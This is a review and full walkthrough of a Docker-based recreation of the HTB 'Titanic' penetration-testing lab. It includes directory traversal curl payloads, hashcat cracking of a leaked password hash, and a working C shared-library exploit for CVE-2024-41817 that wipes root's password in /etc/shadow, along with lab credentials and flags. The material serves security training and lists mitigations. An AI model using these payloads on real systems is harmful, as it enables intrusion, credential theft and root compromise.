# Titanic HTB Lab - Comprehensive Review

## Executive Summary

This document provides a complete review of the Titanic HTB lab recreation, detailing all components, vulnerabilities, and how they work together to create a realistic penetration testing environment.

## Lab Components Overview

### 1. Infrastructure (Docker-based)

The lab uses 4 Docker containers orchestrated with Docker Compose:

| Container | Purpose                         | Ports            | IP Address  |
| --------- | ------------------------------- | ---------------- | ----------- |
| nginx     | Reverse proxy for vHost routing | 80               | 172.20.0.10 |
| flask-app | Vulnerable booking application  | Internal 5000    | 172.20.0.11 |
| gitea     | Git repository server           | 3000, 2222 (SSH) | 172.20.0.12 |
| target    | SSH server with privesc vuln    | 22 → 2222        | 172.20.0.13 |

### 2. Network Architecture

```
                                    ┌─────────────────┐
                                    │   Attacker      │
                                    │   Machine       │
                                    └────────┬────────┘
                                             │
                                    Port 80  │  Port 2222
                                             │
                     ┌───────────────────────┴───────────────────────┐
                     │                                               │
              ┌──────▼──────┐                                ┌──────▼──────┐
              │    Nginx    │                                │   Target    │
              │   Proxy     │                                │  SSH Server │
              │  (Port 80)  │                                │  (Port 22)  │
              └──────┬──────┘                                └─────────────┘
                     │
         ┌───────────┴───────────┐
         │                       │
    ┌────▼────┐           ┌─────▼─────┐
    │  Flask  │           │   Gitea   │
    │   App   │◄─ share ─►│  Server   │
    │ (5000)  │  volumes  │  (3000)   │
    └─────────┘           └───────────┘
```

### 3. Shared Resources

**Docker Volumes**:

- `gitea-data`: Gitea's database and repositories (shared read-only with target)
- `tickets-data`: Flask booking tickets (shared read-only with target)

This sharing simulates a realistic environment where:

- Gitea runs on the server and mounts `/home/developer/gitea/data`
- The Flask app runs on the server and stores tickets in `/opt/app/tickets`
- Both are accessible via directory traversal from the Flask app

## Vulnerability Analysis

### Vulnerability Chain

```
Web Enum → Subdomain Discovery → Source Code Leak → Directory Traversal →
Database Extraction → Password Crack → SSH Access → System Enum →
ImageMagick CVE → Privilege Escalation → Root Access
```

### Detailed Vulnerability Breakdown

#### 1. Information Disclosure (Gitea)

**Location**: http://dev.titanic.htb  
**Severity**: Medium  
**Description**: Public repositories expose sensitive information

**Exposed Information**:

- Flask application source code (reveals vulnerabilities)
- Docker Compose configurations (reveals file paths)
- Database location: `/home/developer/gitea/data/gitea/gitea.db`
- Gitea configuration paths

**Exploitation**:

```bash
# Discover subdomain
ffuf -w wordlist.txt -u http://titanic.htb -H "Host: FUZZ.titanic.htb"

# Register and explore
# Browse to http://dev.titanic.htb/developer/docker-config
# Browse to http://dev.titanic.htb/developer/flask-app
```

**Mitigation**:

- Make repositories private
- Implement access controls
- Don't commit sensitive configuration
- Use environment variables for secrets

---

#### 2. Directory Traversal (Flask)

**Location**: http://titanic.htb/download?ticket=  
**Severity**: High  
**CVSS**: 7.5  
**CWE**: CWE-22

**Vulnerable Code**:

```python
json_filepath = os.path.join(TICKETS_DIR, ticket)  # No sanitization!
if os.path.exists(json_filepath):
    return send_file(json_filepath, as_attachment=True)
```

**Exploitation**:

```bash
# Read /etc/passwd
curl "http://titanic.htb/download?ticket=../../../../etc/passwd"

# Download Gitea database (learned path from repos)
curl "http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/gitea.db" -o gitea.db
```

**Impact**:

- Read any file accessible to Flask user
- Extract Gitea database with password hashes
- Access configuration files
- Potential to read SSH keys (if present)

---

#### 3. Weak Credentials

**Location**: Gitea database  
**Severity**: High  
**Username**: developer  
**Password**: 25282528

**Hash Details**:

- Algorithm: PBKDF2-HMAC-SHA256
- Iterations: 50,000
- Salt: 8bf3e3452b78544f8bee9400d6936d34
- Hash: e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56

**Cracking**:

```bash
# Convert to Hashcat format
echo 'sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=' > hash.txt

# Crack with Hashcat
hashcat -m 10900 hash.txt rockyou.txt

# Result: 25282528
```

**Why It's Weak**:

- Simple numeric pattern
- In common wordlists (rockyou.txt)
- PBKDF2 with 50k iterations insufficient against GPUs

---

#### 4. Privilege Escalation (CVE-2024-41817)

**Location**: ImageMagick 7.1.1-35  
**Severity**: Critical  
**CVSS**: 9.8  
**CVE**: CVE-2024-41817

**Vulnerable Script** (`/opt/scripts/identify_images.sh`):

```bash
#!/bin/bash
cd /opt/app/static/assets/images  # CD to writable directory
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | \
    xargs /usr/local/bin/magick identify >> metadata.log
```

**Execution Context**:

- Runs via cron every minute
- Executes as root
- Changes to directory writable by developer user

**Vulnerability**: LD_LIBRARY_PATH hijacking. When `magick` runs from the images directory, it loads shared libraries from the current directory.

**Exploitation**:

```c
// Malicious library: libxcb.so.1
#include <stdlib.h>

__attribute__((constructor)) void init() {
    system("sed -i 's/^root:[^:]*:/root::/' /etc/shadow");
    exit(0);
}
```

Compile and place:

```bash
gcc -shared -fPIC -o libxcb.so.1 exploit.c
cp libxcb.so.1 /opt/app/static/assets/images/
# Wait for cron...
su root  # No password needed
```

**Impact**:

- Full system compromise
- Root-level code execution
- Persistence possible

## Complete Attack Path

### Phase 1: Reconnaissance

```bash
# 1. Port scan
nmap -p- -sV -sC titanic.htb

# 2. Web enumeration
curl http://titanic.htb
gobuster dir -u http://titanic.htb -w wordlist.txt

# 3. Virtual host discovery
ffuf -w subdomains.txt -u http://titanic.htb -H "Host: FUZZ.titanic.htb"
# Discovers: dev.titanic.htb
```

### Phase 2: Information Gathering

```bash
# 1. Browse to dev.titanic.htb
# 2. Register user (open registration)
# 3. Explore repositories:
#    - docker-config → reveals paths
#    - flask-app → reveals source code

# Key findings:
# - Gitea data at: /home/developer/gitea/data
# - Flask vulnerability in /download endpoint
# - No input sanitization
```

### Phase 3: Exploitation

```bash
# 1. Test directory traversal
curl "http://titanic.htb/download?ticket=../../../../etc/passwd"

# 2. Download Gitea database
curl "http://titanic.htb/download?ticket=../../../../home/developer/gitea/data/gitea/gitea.db" \
     -o gitea.db

# 3. Extract hash from database
sqlite3 gitea.db "SELECT name, passwd, salt FROM user WHERE name='developer';"

# 4. Convert hash to Hashcat format (hex → base64)
# 5. Crack with Hashcat
hashcat -m 10900 hash.txt rockyou.txt
# Password: 25282528
```

### Phase 4: Initial Access

```bash
# SSH login
ssh developer@titanic.htb -p 2222
# Password: 25282528

# Get user flag
cat ~/user.txt
# d8b1aece4bc98dac1b3cb90946c7647e
```

### Phase 5: Privilege Escalation

```bash
# 1. Enumerate system
ls -la /opt/scripts/
cat /opt/scripts/identify_images.sh

# 2. Check ImageMagick version
/usr/local/bin/magick -version
# ImageMagick 7.1.1-35 → Vulnerable!

# 3. Check write permissions
ls -la /opt/app/static/assets/images/
# developer has write access

# 4. Create exploit
cat > exploit.c << 'EOF'
#include <stdlib.h>
__attribute__((constructor)) void init() {
    system("sed -i 's/^root:[^:]*:/root::/' /etc/shadow");
    exit(0);
}
EOF

# 5. Compile
gcc -shared -fPIC -o libxcb.so.1 exploit.c

# 6. Deploy
cp libxcb.so.1 /opt/app/static/assets/images/

# 7. Wait for cron (every minute)
watch -n 5 'ls -la /etc/shadow'

# 8. Escalate
su root  # No password

# 9. Get root flag
cat /root/root.txt
# 95e72bf418462d4519f4dc695236ec2e
```

## Security Lessons & Takeaways

### For Developers

1. **Input Validation**: Always sanitize user input, especially file paths
2. **Least Privilege**: Don't run services as root
3. **Dependency Management**: Keep software updated (ImageMagick CVE)
4. **Source Code Protection**: Don't expose source in production
5. **Strong Password Policies**: Enforce complexity requirements

### For Security Teams

1. **Defense in Depth**: Multiple layers prevent total compromise
2. **Monitoring**: Detect unusual library loads, SUID changes
3. **Attack Surface Reduction**: Minimize exposed services
4. **Regular Updates**: Patch management is critical
5. **Code Reviews**: Security review before deployment

### For Penetration Testers

1. **Enumeration is Key**: Thorough recon reveals attack paths
2. **Chain Vulnerabilities**: Low-severity bugs chain to critical impact
3. **Read Source Code**: When available, source reveals vulnerabilities
4. **Research CVEs**: Known vulnerabilities in identified software
5. **Patience**: Some exploits (cron jobs) require waiting

## Lab Setup Summary

### What's Included

✅ Docker Compose configuration  
✅ Vulnerable Flask application with directory traversal  
✅ Gitea server (requires manual repo setup)  
✅ SSH server with developer user  
✅ ImageMagick 7.1.1-35 (CVE-2024-41817)  
✅ Cron job for privilege escalation  
✅ Comprehensive documentation  
✅ Complete walkthrough  
✅ Exploitation details

### What Needs Manual Setup

⚠️ Gitea repositories (flask-app and docker-config)  
⚠️ DNS entries in /etc/hosts  
⚠️ Initial Gitea user registration

See [GITEA_SETUP.md](GITEA_SETUP.md) for detailed instructions.

## Testing the Lab

### Quick Validation

```bash
# 1. Check containers are running
docker compose ps

# 2. Test web interfaces
curl -I http://titanic.htb
curl -I http://dev.titanic.htb

# 3. Test directory traversal
curl "http://titanic.htb/download?ticket=../../../../etc/passwd"

# 4. Test SSH access
ssh developer@localhost -p 2222
# Password: 25282528

# 5. Verify ImageMagick version
ssh developer@localhost -p 2222 "/usr/local/bin/magick -version"
```

### Success Criteria

- [x] All 4 containers running
- [x] Web interfaces accessible
- [x] Directory traversal works
- [x] SSH login successful
- [x] ImageMagick vulnerable version installed
- [x] Developer has write access to images directory
- [x] Cron job is configured

## Troubleshooting Common Issues

### Issue 1: Containers Not Starting

```bash
# Check logs
docker compose logs

# Rebuild
docker compose down -v
docker compose build --no-cache
docker compose up -d
```

### Issue 2: Can't Access Web Interfaces

```bash
# Verify /etc/hosts
grep titanic /etc/hosts

# Should show:
# 127.0.0.1 titanic.htb dev.titanic.htb

# Check nginx routing
docker compose logs nginx
```

### Issue 3: SSH Connection Refused

```bash
# Wait for SSH to start (takes 10-15 seconds)
sleep 15
ssh developer@localhost -p 2222
```

### Issue 4: ImageMagick Exploit Not Working

```bash
# Verify cron is running in container
docker exec titanic-target service cron status

# Check script permissions
docker exec titanic-target ls -la /opt/scripts/

# Check images directory permissions
docker exec titanic-target ls -la /opt/app/static/assets/images/

# Manually trigger script for testing
docker exec -u root titanic-target /opt/scripts/identify_images.sh
```

## Performance Considerations

### Resource Usage

- **CPU**: Moderate during builds, low during runtime
- **RAM**: ~2GB for all containers
- **Disk**: ~5GB total (mostly ImageMagick build)

### Build Time

- **First build**: 5-10 minutes (compiling ImageMagick)
- **Subsequent builds**: 1-2 minutes (cached layers)

### Optimization Tips

```bash
# Use BuildKit for faster builds
DOCKER_BUILDKIT=1 docker compose build

# Prune old images
docker system prune -a
```

## Extending the Lab

### Ideas for Enhancement

1. **Add MySQL Container**: Actually expose MySQL from docker-config
2. **Add More Flags**: Easter eggs throughout the system
3. **Add Red Herrings**: False vulnerabilities to test thoroughness
4. **Add IDS/IPS**: Practice evasion techniques
5. **Add Web Firewall**: WAF bypass challenges

### Creating Variants

**Easy Mode**:

- Remove directory traversal, provide direct database download
- Display password hash on Gitea page
- Add hints in HTML comments

**Hard Mode**:

- Require SQL injection to extract hashes
- Add input filtering (bypassable)
- Require custom exploit for ImageMagick

## Cleanup

```bash
# Stop all containers
docker compose down

# Remove all data (full reset)
docker compose down -v

# Remove images
docker compose down --rmi all

# Remove /etc/hosts entries
sudo sed -i '/titanic.htb/d' /etc/hosts
```

## Conclusion

This lab provides a realistic, safe environment for practicing:

- Web application exploitation
- Password cracking
- Linux privilege escalation
- CVE research and exploitation

It's designed to be:

- **Realistic**: Based on actual HTB machine
- **Educational**: Multiple learning opportunities
- **Safe**: Isolated in Docker containers
- **Repeatable**: Easy to reset and retry

Perfect for:

- Learning penetration testing
- Practicing for OSCP/CEH
- Teaching security concepts
- Developing exploitation skills

---

**Happy Hacking! 🚢**
